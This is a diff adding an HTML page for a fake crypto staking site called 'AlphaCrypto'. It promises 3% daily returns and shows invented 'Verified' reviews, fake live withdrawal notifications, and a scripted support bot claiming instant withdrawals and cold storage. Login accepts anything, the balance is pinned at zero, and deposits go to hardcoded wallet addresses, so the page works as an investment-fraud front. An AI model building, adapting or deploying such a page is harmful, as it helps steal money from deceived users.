@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AlphaCrypto | Secure Staking</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
+        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #020617; color: white; overflow-x: hidden; scroll-behavior: smooth; }
+        .glass-card { background: rgba(30, 41, 59, 0.4); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.08); }
+        .crypto-gradient { background: linear-gradient(135deg, #0ea5e9 0%, #6366f1 100%); }
+        .modal-overlay { background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(4px); display: none; }
+        .modal-content { transform: scale(0.9); transition: 0.3s; }
+        .modal-active .modal-content { transform: scale(1); }
+        .tab-content { display: none; }
+        .tab-active { display: block; }
+        .nav-item { color: #64748b; transition: 0.3s; }
+        .nav-active { color: #0ea5e9; }
+        #authOverlay { position: fixed; inset: 0; z-index: 999; background: #020617; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .auth-input { width: 100%; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 14px 20px; outline: none; transition: 0.3s; }
+        .progress-bg { background: rgba(255,255,255,0.1); height: 6px; border-radius: 10px; overflow: hidden; margin-top: 8px; }
+        .progress-fill { background: linear-gradient(90deg, #0ea5e9, #4ade80); height: 100%; width: 5%; }
+        
+        #profitPopup, #liveToast { display: none; position: fixed; left: 50%; transform: translateX(-50%); z-index: 1000; width: 90%; max-width: 350px; animation: slideIn 0.5s ease-out; }
+        #profitPopup { top: 20px; border: 1px solid rgba(74, 222, 128, 0.5); }
+        #liveToast { bottom: 100px; left: 20px; transform: none; border: 1px solid rgba(14, 165, 233, 0.3); }
+        
+        @keyframes slideIn { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        #chatWidget { display: none; position: fixed; bottom: 100px; right: 20px; width: 320px; z-index: 200; animation: slideUp 0.3s ease-out; }
+        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        .no-scrollbar::-webkit-scrollbar { display: none; }
+        .vip-badge { background: linear-gradient(45deg, #ffd700, #ff8c00); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .suggestion-btn { background: rgba(14, 165, 233, 0.1); border: 1px solid rgba(14, 165, 233, 0.3); padding: 6px 12px; border-radius: 12px; font-size: 10px; white-space: nowrap; cursor: pointer; transition: 0.2s; }
+        .suggestion-btn:hover { background: rgba(14, 165, 233, 0.3); }
+        input[type=range] { -webkit-appearance: none; background: rgba(255,255,255,0.1); height: 8px; border-radius: 5px; }
+        input[type=range]::-webkit-slider-thumb { -webkit-appearance: none; height: 20px; width: 20px; border-radius: 50%; background: #0ea5e9; cursor: pointer; box-shadow: 0 0 10px rgba(14, 165, 233, 0.5); }
+    </style>
+</head>
+<body class="pb-32">
+
+    <div id="profitPopup" class="glass-card p-4 rounded-2xl flex items-center space-x-4 shadow-2xl">
+        <div class="bg-green-500/20 p-3 rounded-full"><i class="fa-solid fa-arrow-trend-up text-green-400"></i></div>
+        <div><p class="text-[10px] font-bold text-slate-400 uppercase">Daily Profit Distributed</p><p class="text-sm font-black text-white">+3.00% Earnings Added</p></div>
+    </div>
+
+    <div id="liveToast" class="glass-card p-4 rounded-2xl flex items-center space-x-3 shadow-2xl">
+        <div class="crypto-gradient p-2 rounded-full h-8 w-8 flex items-center justify-center text-[10px]"><i class="fas fa-sync-alt"></i></div>
+        <div><p class="text-[10px] text-slate-400 font-bold" id="toastUser">User 4547</p><p class="text-[12px] font-black" id="toastAction">just withdrew $3,000.00</p></div>
+    </div>
+
+    <div id="authOverlay">
+        <div id="loginForm" class="glass-card p-8 rounded-[2.5rem] w-full max-w-md text-center">
+            <div class="flex items-center justify-center space-x-2 mb-8"><div class="crypto-gradient p-2 rounded-xl italic font-black">AC</div><span class="text-xl font-extrabold uppercase">AlphaCrypto</span></div>
+            <div class="space-y-4">
+                <input type="text" id="loginUser" placeholder="Email or Phone Number" class="auth-input">
+                <input type="password" id="loginPass" placeholder="Password" class="auth-input">
+                <button onclick="validateLogin()" class="w-full py-4 rounded-2xl font-bold crypto-gradient text-white active:scale-95 transition">Login</button>
+                <p class="text-xs text-slate-500">No account? <a href="javascript:void(0)" onclick="toggleAuth('signup')" class="text-blue-400 font-bold">Sign Up</a></p>
+            </div>
+        </div>
+        <div id="signupForm" class="glass-card p-8 rounded-[2.5rem] w-full max-w-md hidden">
+            <h2 class="text-2xl font-black mb-6 text-center italic">Join AlphaCrypto</h2>
+            <div class="space-y-3">
+                <input type="email" id="signEmail" placeholder="Email Address" class="auth-input">
+                <div class="flex space-x-2"><input type="text" value="+1" class="auth-input w-20 text-center" readonly><input type="number" id="signPhone" placeholder="Phone Number" class="auth-input"></div>
+                <input type="password" id="signPass" placeholder="Password" class="auth-input">
+                <input type="text" placeholder="Referral Code (Optional)" class="auth-input">
+                <button onclick="validateSignup()" class="w-full py-4 rounded-2xl font-bold crypto-gradient text-white active:scale-95 transition">Sign Up</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="mainDashboard" style="display:none;">
+        <nav class="p-6 flex justify-between items-center border-b border-white/5 sticky top-0 bg-[#020617]/90 backdrop-blur-md z-50">
+            <div class="flex items-center space-x-2"><div class="crypto-gradient p-2 rounded-xl italic font-black">AC</div><span class="text-xl font-extrabold uppercase">AlphaCrypto</span></div>
+            <div class="bg-white/5 px-4 py-2 rounded-2xl border border-white/10 text-green-400 font-bold text-sm" id="navBalance">$0.00</div>
+        </nav>
+
+        <main id="homePage" class="tab-content tab-active max-w-7xl mx-auto px-6 py-10">
+            <div class="flex items-center justify-center space-x-4 mb-6 text-center">
+                <div class="flex text-yellow-400 text-sm"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
+                <p class="text-xs font-bold text-slate-300">5.0/5 Stars • Verified Reviews</p>
+            </div>
+
+            <div class="glass-card p-6 rounded-[2rem] mb-6 border border-yellow-500/20 relative overflow-hidden text-center">
+                <h4 class="text-sm font-black uppercase tracking-widest mb-4">Account: <span class="vip-badge">Diamond VIP</span></h4>
+                <div class="grid grid-cols-2 gap-4">
+                    <div class="bg-white/5 p-3 rounded-xl border border-white/5 text-center"><p class="text-[9px] text-slate-400 font-bold uppercase">Limits</p><p class="text-xs font-bold">Unlimited</p></div>
+                    <div class="bg-white/5 p-3 rounded-xl border border-white/5 text-center"><p class="text-[9px] text-slate-400 font-bold uppercase">Bonus</p><p class="text-xs font-bold">+0.5% Extra</p></div>
+                </div>
+            </div>
+
+            <div class="glass-card p-8 rounded-[2.5rem] mb-12 border border-blue-500/20">
+                <h3 class="text-lg font-black mb-6 italic text-center">Earnings Calculator</h3>
+                <div class="space-y-6">
+                    <div>
+                        <div class="flex justify-between mb-4"><span class="text-xs font-bold text-slate-400 uppercase">Investment Amount</span><span class="text-blue-400 font-black" id="calcAmountShow">$500</span></div>
+                        <input type="range" id="calcRange" min="100" max="50000" step="100" value="500" class="w-full" oninput="updateCalculator()">
+                    </div>
+                    <div class="grid grid-cols-2 gap-4">
+                        <div class="bg-white/5 p-4 rounded-2xl border border-white/5">
+                            <p class="text-[10px] text-slate-400 font-bold uppercase mb-1">Daily Profit</p>
+                            <p class="text-lg font-black text-green-400" id="calcDaily">$15.00</p>
+                        </div>
+                        <div class="bg-white/5 p-4 rounded-2xl border border-white/5">
+                            <p class="text-[10px] text-slate-400 font-bold uppercase mb-1">14-Day Return</p>
+                            <p class="text-lg font-black text-blue-400" id="calcTotal">$210.00</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <h3 class="text-xl font-black mb-6 italic text-blue-400">Available Staking</h3>
+            <div id="crypto-grid" class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-16"></div>
+
+            <h3 class="text-xl font-black mb-6 italic">Investor Feedback</h3>
+            <div class="flex space-x-4 overflow-x-auto pb-6 mb-16 no-scrollbar" id="reviews-slider">
+                <div class="glass-card p-6 rounded-3xl min-w-[280px]"><div class="flex items-center mb-3"><div class="w-8 h-8 rounded-full bg-blue-500 flex items-center justify-center font-bold text-xs mr-3">JD</div><div><p class="text-xs font-bold">Jason D.</p><p class="text-[9px] text-green-400 uppercase font-black">Verified</p></div></div><p class="text-xs text-slate-400 italic">"Consistent 3% returns. Best staking platform I've used in 2026."</p></div>
+                <div class="glass-card p-6 rounded-3xl min-w-[280px]"><div class="flex items-center mb-3"><div class="w-8 h-8 rounded-full bg-purple-500 flex items-center justify-center font-bold text-xs mr-3">SL</div><div><p class="text-xs font-bold">Sarah L.</p><p class="text-[9px] text-green-400 uppercase font-black">Verified</p></div></div><p class="text-xs text-slate-400 italic">"Fast withdrawals and a simple interface. Highly recommended."</p></div>
+                <div class="glass-card p-6 rounded-3xl min-w-[280px]"><div class="flex items-center mb-3"><div class="w-8 h-8 rounded-full bg-emerald-500 flex items-center justify-center font-bold text-xs mr-3">MK</div><div><p class="text-xs font-bold">Mark K.</p><p class="text-[9px] text-green-400 uppercase font-black">Verified</p></div></div><p class="text-xs text-slate-400 italic">"Started with $500 and compounding is incredible. Very secure."</p></div>
+                <div class="glass-card p-6 rounded-3xl min-w-[280px]"><div class="flex items-center mb-3"><div class="w-8 h-8 rounded-full bg-red-500 flex items-center justify-center font-bold text-xs mr-3">AT</div><div><p class="text-xs font-bold">Anna T.</p><p class="text-[9px] text-green-400 uppercase font-black">Verified</p></div></div><p class="text-xs text-slate-400 italic">"Support team is very responsive. My deposit was verified in minutes."</p></div>
+            </div>
+
+            <h3 class="text-xl font-black mb-6 italic">Deposit Assets</h3>
+            <div id="deposit-grid" class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-16"></div>
+
+            <div class="glass-card p-8 rounded-[2.5rem] border-blue-500/30">
+                <h3 class="text-xl font-black mb-4">Verification</h3>
+                <input type="text" id="txHash" placeholder="Enter TxID (Hash)" class="w-full bg-white/5 border border-white/10 rounded-2xl py-4 px-6 mb-4 outline-none font-mono">
+                <button onclick="submitVerify()" class="w-full py-4 rounded-2xl font-bold crypto-gradient text-white">Verify Deposit</button>
+            </div>
+        </main>
+
+        <main id="withdrawPage" class="tab-content max-w-7xl mx-auto px-6 py-10">
+            <h3 class="text-2xl font-black mb-8 italic text-center">Withdraw Funds</h3>
+            <div class="glass-card p-8 rounded-[2.5rem] max-w-md mx-auto border border-white/5">
+                <p class="text-xs font-bold text-slate-400 uppercase mb-2">Available Balance</p>
+                <p class="text-3xl font-black mb-8 text-green-400" id="withdrawDisplay">$0.00</p>
+                <input type="number" id="withdrawAmt" placeholder="Amount (Min $10)" class="auth-input mb-4">
+                <input type="text" id="withdrawAddr" placeholder="Your Wallet Address" class="auth-input mb-4">
+                <button onclick="handleWithdraw()" class="w-full py-4 rounded-2xl font-bold crypto-gradient text-white">Submit Withdrawal</button>
+            </div>
+        </main>
+
+        <main id="historyPage" class="tab-content max-w-7xl mx-auto px-6 py-10">
+            <h3 class="text-2xl font-black mb-8 italic">Asset History</h3>
+            <div id="stakeHistory" class="space-y-4"></div>
+        </main>
+
+        <button onclick="toggleChat()" class="fixed bottom-24 right-6 w-14 h-14 crypto-gradient rounded-full shadow-2xl flex items-center justify-center z-[150]">
+            <i class="fas fa-comment-dots text-white text-xl"></i>
+        </button>
+
+        <div id="chatWidget" class="glass-card rounded-[2rem] overflow-hidden shadow-2xl border border-white/10">
+            <div class="crypto-gradient p-4 flex justify-between items-center text-white">
+                <div class="flex items-center space-x-2"><div class="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div><span class="text-[10px] font-black uppercase">Live Support</span></div>
+                <button onclick="toggleChat()"><i class="fas fa-times text-xs"></i></button>
+            </div>
+            <div class="h-64 p-4 overflow-y-auto bg-[#020617]/50 text-[11px] space-y-3 no-scrollbar" id="chatBox">
+                <div class="bg-white/5 p-3 rounded-2xl">Hello! Welcome to AlphaCrypto support. How can we help?</div>
+            </div>
+            <div class="px-4 py-2 border-t border-white/5 flex space-x-2 overflow-x-auto no-scrollbar" id="suggestions">
+                <button class="suggestion-btn" onclick="askQuestion('What is the minimum deposit?')">Min Deposit?</button>
+                <button class="suggestion-btn" onclick="askQuestion('How long do withdrawals take?')">Withdrawal Time?</button>
+                <button class="suggestion-btn" onclick="askQuestion('Is my investment safe?')">Is it safe?</button>
+            </div>
+            <div class="p-3 bg-white/5 flex space-x-2">
+                <input type="text" id="chatInput" placeholder="Type message..." class="bg-transparent text-xs outline-none flex-1 text-white">
+                <button onclick="sendMessage()" class="text-blue-400"><i class="fas fa-paper-plane"></i></button>
+            </div>
+        </div>
+
+        <div class="fixed bottom-0 left-0 right-0 bg-[#020617]/95 backdrop-blur-xl border-t border-white/5 px-4 py-4 flex justify-around z-50">
+            <button onclick="switchTab('homePage', this)" class="nav-item nav-active flex flex-col items-center"><i class="fa-solid fa-bolt text-lg"></i><span class="text-[9px] mt-1 font-bold">Staking</span></button>
+            <button onclick="switchTab('withdrawPage', this)" class="nav-item flex flex-col items-center"><i class="fa-solid fa-money-bill-transfer text-lg"></i><span class="text-[9px] mt-1 font-bold">Withdraw</span></button>
+            <button onclick="switchTab('historyPage', this)" class="nav-item flex flex-col items-center"><i class="fa-solid fa-clock-rotate-left text-lg"></i><span class="text-[9px] mt-1 font-bold">History</span></button>
+        </div>
+    </div>
+
+    <div id="depositModal" class="modal-overlay fixed inset-0 z-[210] items-center justify-center p-6"><div class="modal-content glass-card w-full max-w-md p-8 rounded-[2.5rem] relative text-center text-white"><button onclick="closeDeposit()" class="absolute top-6 right-6 text-slate-500"><i class="fa-solid fa-xmark text-xl"></i></button><h2 class="text-2xl font-black mb-2 italic">Deposit <span id="depName"></span></h2><p class="text-[10px] text-blue-400 mb-2 font-bold uppercase" id="depNetName"></p><p class="text-[9px] text-red-400 mb-4 font-bold uppercase">MINIMUM DEPOSIT: $100</p><p id="depAddress" class="text-xs font-mono break-all bg-white/5 p-4 rounded-xl border border-white/10 mb-6"></p><button id="copyDep" class="w-full py-4 rounded-2xl font-bold crypto-gradient text-white">Copy Address</button></div></div>
+    
+    <div id="stakeModal" class="modal-overlay fixed inset-0 z-[200] items-center justify-center p-6"><div class="modal-content glass-card w-full max-w-md p-8 rounded-[2.5rem] relative text-white"><button onclick="closeModal()" class="absolute top-6 right-6 text-slate-500"><i class="fa-solid fa-xmark text-xl"></i></button><h2 class="text-2xl font-black mb-6 italic">Stake <span id="modalCoinName"></span></h2><input type="number" id="stakeAmount" oninput="validateStakeInput()" placeholder="Min Amount $100" class="auth-input mb-4"><div class="bg-blue-500/10 p-4 rounded-2xl mb-6 flex justify-between"><span class="text-xs font-bold text-slate-400">14-Day Profit</span><span class="text-green-400 font-bold" id="estProfit">$0.00</span></div><button id="confirmBtn" onclick="handleConfirm()" disabled class="w-full py-4 rounded-2xl font-bold bg-slate-800 text-slate-500 cursor-not-allowed">Activate Contract</button></div></div>
+
+    <script>
+        // Persistence Initialization - Hard Reset to 0
+        if (localStorage.getItem('alpha_bal') !== '0') {
+            localStorage.setItem('alpha_bal', '0');
+        }
+        
+        let balance = 0;
+        let historyData = localStorage.getItem('alpha_history') ? localStorage.getItem('alpha_history') : '';
+
+        const coins = [
+            { name: "Bitcoin", symbol: "BTC", icon: "fa-bitcoin", network: "BTC Network", address: "bc1qt7zlwlmamph8vt4d0dwdjjnq8yehgvjr6883va", color: "text-orange-500" },
+            { name: "Ethereum", symbol: "ETH", icon: "fa-ethereum", network: "ERC20 Network", address: "0x04065cCfbbcccaD53102B98ADE0e0644E088367C", color: "text-blue-400" },
+            { name: "Solana", symbol: "SOL", icon: "fa-bolt", network: "SOL Network", address: "37TkwujqyjCCREcUePrWeHVMwU3ZUuGUrUR9xzbbpmAH", color: "text-purple-400" },
+            { name: "BNB", symbol: "BNB", icon: "fa-coins", network: "BEP20 Network", address: "0x04065cCfbbcccaD53102B98ADE0e0644E088367C", color: "text-yellow-500" },
+            { name: "Tether", symbol: "USDT", icon: "fa-dollar-sign", network: "ERC20 Network", address: "0x04065cCfbbcccaD53102B98ADE0e0644E088367C", color: "text-green-500" },
+            { name: "USD Coin", symbol: "USDC", icon: "fa-circle-dollar-to-slot", network: "ERC20 Network", address: "0x04065cCfbbcccaD53102B98ADE0e0644E088367C", color: "text-blue-500" },
+            { name: "Litecoin", symbol: "LTC", icon: "fa-litecoin-sign", network: "LTC Network", address: "ltc1q7tk45fa8mpnp72trrx6rvqgdudfsyrezug83yq", color: "text-slate-300" },
+            { name: "Tron", symbol: "TRX", icon: "fa-diamond", network: "TRC20 Network", address: "TAcr9Zt9JMS7SXB5CqFqGAoN38GN4Xxa9n", color: "text-red-500" }
+        ];
+
+        function updateUI() {
+            document.getElementById('navBalance').innerText = `$${balance.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
+            document.getElementById('withdrawDisplay').innerText = `$${balance.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
+            document.getElementById('stakeHistory').innerHTML = historyData;
+            localStorage.setItem('alpha_bal', balance);
+            localStorage.setItem('alpha_history', historyData);
+        }
+
+        function toggleAuth(mode) { 
+            document.getElementById('loginForm').classList.toggle('hidden', mode === 'signup'); 
+            document.getElementById('signupForm').classList.toggle('hidden', mode === 'login'); 
+        }
+        
+        function validateLogin() { enterDashboard(); }
+        function validateSignup() { enterDashboard(); }
+
+        function enterDashboard() { 
+            document.getElementById('authOverlay').style.display = 'none'; 
+            document.getElementById('mainDashboard').style.display = 'block'; 
+            render(); 
+            updateUI();
+            showPopup('profitPopup', 3000);
+            updateCalculator();
+            setInterval(() => {
+                const user = Math.floor(1000 + Math.random() * 8999);
+                const type = Math.random() > 0.4 ? "withdrew" : "deposited";
+                document.getElementById('toastUser').innerText = "User " + user;
+                document.getElementById('toastAction').innerText = `just ${type} $${Math.floor(1000 + Math.random() * 6000)}.00`;
+                showPopup('liveToast', 4500);
+            }, 9000); 
+        }
+
+        function render() {
+            document.getElementById('crypto-grid').innerHTML = coins.map(coin => `
+                <div class="glass-card p-4 rounded-3xl flex flex-col items-center text-white">
+                    <div class="crypto-gradient w-10 h-10 rounded-xl flex items-center justify-center text-lg mb-2"><i class="fas ${coin.icon}"></i></div>
+                    <h4 class="font-bold text-[10px]">${coin.symbol}</h4>
+                    <p class="text-green-400 text-[8px] mb-3 font-black">3% DAILY</p>
+                    <button onclick="openModal('${coin.name}')" class="w-full bg-blue-600 py-1.5 rounded-lg font-bold text-[9px]">Stake</button>
+                </div>`).join('');
+
+            document.getElementById('deposit-grid').innerHTML = coins.map(coin => `
+                <div class="glass-card p-6 rounded-3xl flex justify-between items-center">
+                    <div><p class="text-[10px] font-black ${coin.color} uppercase">${coin.name}</p><p class="text-[9px] text-slate-400">${coin.network}</p></div>
+                    <button onclick="openDeposit('${coin.name}', '${coin.address}', '${coin.network}')" class="bg-blue-600 px-6 py-2 rounded-xl text-xs font-bold">Deposit</button>
+                </div>`).join('');
+        }
+
+        function handleConfirm() {
+            const amt = parseFloat(document.getElementById('stakeAmount').value);
+            if(amt > balance) return alert("Insufficient Balance");
+            balance -= amt;
+            const newEntry = `<div class="glass-card p-4 rounded-2xl mb-3"><div class="flex justify-between text-sm font-bold"><span>Stake $${amt.toLocaleString()}</span><span class="text-green-400">Day 1/14</span></div><div class="progress-bg"><div class="progress-fill"></div></div></div>`;
+            historyData = newEntry + historyData;
+            updateUI();
+            closeModal();
+        }
+
+        function handleWithdraw() {
+            const amt = parseFloat(document.getElementById('withdrawAmt').value);
+            if(isNaN(amt) || amt < 10) return alert("Minimum withdrawal is $10");
+            if(amt > balance) return alert("Insufficient Balance");
+            balance -= amt; 
+            updateUI();
+            alert("Submitted!");
+        }
+
+        function updateCalculator() {
+            const val = parseInt(document.getElementById('calcRange').value);
+            document.getElementById('calcAmountShow').innerText = "$" + val.toLocaleString();
+            document.getElementById('calcDaily').innerText = "$" + (val * 0.03).toFixed(2);
+            document.getElementById('calcTotal').innerText = "$" + (val * 0.42).toFixed(2);
+        }
+        function showPopup(id, time) {
+            const p = document.getElementById(id); p.style.display = 'flex';
+            setTimeout(() => { p.style.opacity = '0'; setTimeout(() => { p.style.display = 'none'; p.style.opacity = '1'; }, 500); }, time);
+        }
+        function openDeposit(n, a, net) { 
+            document.getElementById('depName').innerText = n; 
+            document.getElementById('depNetName').innerText = net;
+            document.getElementById('depAddress').innerText = a; 
+            document.getElementById('depositModal').style.display = 'flex'; 
+            document.getElementById('copyDep').onclick = () => { navigator.clipboard.writeText(a); alert("Address Copied!"); };
+            setTimeout(() => document.getElementById('depositModal').classList.add('modal-active'), 10); 
+        }
+        function closeDeposit() { document.getElementById('depositModal').classList.remove('modal-active'); setTimeout(() => document.getElementById('depositModal').style.display = 'none', 300); }
+        function switchTab(t, b) { document.querySelectorAll('.tab-content').forEach(x => x.classList.remove('tab-active')); document.getElementById(t).classList.add('tab-active'); document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('nav-active')); b.classList.add('nav-active'); window.scrollTo(0,0); }
+        function openModal(n) { document.getElementById('modalCoinName').innerText = n; document.getElementById('stakeModal').style.display = 'flex'; setTimeout(() => document.getElementById('stakeModal').classList.add('modal-active'), 10); }
+        function closeModal() { document.getElementById('stakeModal').classList.remove('modal-active'); setTimeout(() => document.getElementById('stakeModal').style.display = 'none', 300); }
+        function validateStakeInput() {
+            const v = parseFloat(document.getElementById('stakeAmount').value) || 0;
+            document.getElementById('estProfit').innerText = `$${(v * 0.42).toFixed(2)}`;
+            const b = document.getElementById('confirmBtn');
+            if (v >= 100) { b.disabled = false; b.className = "w-full py-4 rounded-2xl font-bold crypto-gradient text-white"; }
+            else { b.disabled = true; b.className = "w-full py-4 rounded-2xl font-bold bg-slate-800 text-slate-500 cursor-not-allowed"; }
+        }
+        function toggleChat() { const c = document.getElementById('chatWidget'); c.style.display = (c.style.display === 'block') ? 'none' : 'block'; }
+        function askQuestion(q) {
+            addChatMessage(q, 'user');
+            let response = "An agent will be with you shortly.";
+            if (q.includes('minimum deposit')) response = "The minimum deposit on AlphaCrypto is $100 for all assets.";
+            if (q.includes('withdrawals take')) response = "Withdrawals are processed instantly and usually arrive within 5-30 minutes.";
+            if (q.includes('safe')) response = "Yes, AlphaCrypto uses 256-bit encryption and cold storage for all staked assets.";
+            setTimeout(() => addChatMessage(response, 'bot'), 800);
+        }
+        function sendMessage() {
+            const i = document.getElementById('chatInput'); if(!i.value) return;
+            addChatMessage(i.value, 'user');
+            i.value = '';
+            setTimeout(() => addChatMessage("Thank you. Support notified.", 'bot'), 1000);
+        }
+        function addChatMessage(msg, type) {
+            const box = document.getElementById('chatBox');
+            const cls = type === 'user' ? 'bg-blue-600 ml-auto' : 'bg-white/5 mr-auto';
+            box.innerHTML += `<div class="${cls} p-3 rounded-2xl max-w-[80%]">${msg}</div>`;
+            box.scrollTop = box.scrollHeight;
+        }
+        function submitVerify() { alert("Verification Sent!"); document.getElementById('txHash').value = ''; }
+    </script>
+</body>
+</html>
